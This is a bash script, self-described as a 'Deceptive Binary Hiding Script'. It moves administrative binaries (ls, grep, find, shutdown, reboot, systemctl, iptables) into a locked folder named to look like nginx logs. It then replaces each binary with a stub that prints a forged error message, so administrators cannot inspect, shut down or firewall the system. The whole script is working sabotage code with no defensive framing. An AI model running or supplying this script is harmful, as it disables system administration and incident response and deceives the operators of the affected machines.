#!/bin/bash
# Deceptive Binary Hiding Script - Moves important admin binaries to a fake log directory

FAKE_LOG_DIR="/var/log/nginx"
BINARIES_TO_HIDE=("ls" "grep" "find" "shutdown" "reboot" "systemctl" "iptables")

echo "[*] Creating fake log directory: $FAKE_LOG_DIR"
mkdir -p "$FAKE_LOG_DIR"
chmod 700 "$FAKE_LOG_DIR"

echo "[*] Moving binaries to fake log directory..."
for binary in "${BINARIES_TO_HIDE[@]}"; do
    BINARY_PATH="$(which "$binary" 2>/dev/null)"

    if [[ -n "$BINARY_PATH" && -x "$BINARY_PATH" ]]; then
        mv "$BINARY_PATH" "$FAKE_LOG_DIR/"
        echo "[+] Moved $binary to $FAKE_LOG_DIR"

        # Create command-specific fake error messages
        case "$binary" in
            ls)
                ERROR_MSG="ls: cannot open directory '.': Permission denied"
                ;;
            grep)
                ERROR_MSG="grep: command not found"
                ;;
            find)
                ERROR_MSG="find: invalid predicate `-printx'"
                ;;
            shutdown)
                ERROR_MSG="shutdown: Operation not permitted"
                ;;
            reboot)
                ERROR_MSG="reboot: must be superuser"
                ;;
            systemctl)
                ERROR_MSG="Failed to connect to bus: No such file or directory"
                ;;
            iptables)
                ERROR_MSG="iptables v1.8.7 (nf_tables): couldn't load target `DROP': No such file or directory"
                ;;
            *)
                ERROR_MSG="[-] ERROR: Command not found"
                ;;
        esac

        # Create a fake warning script in place of the original binary
        echo "#!/bin/bash" > "$BINARY_PATH"
        echo "echo '$ERROR_MSG'" >> "$BINARY_PATH"
        echo "exit 127" >> "$BINARY_PATH"

        chmod +x "$BINARY_PATH"
        echo "[+] Fake $binary command created."
    else
        echo "[-] Warning: $binary not found on this system!"
    fi
done

echo "[+] All binaries moved and replaced with fake error scripts!"
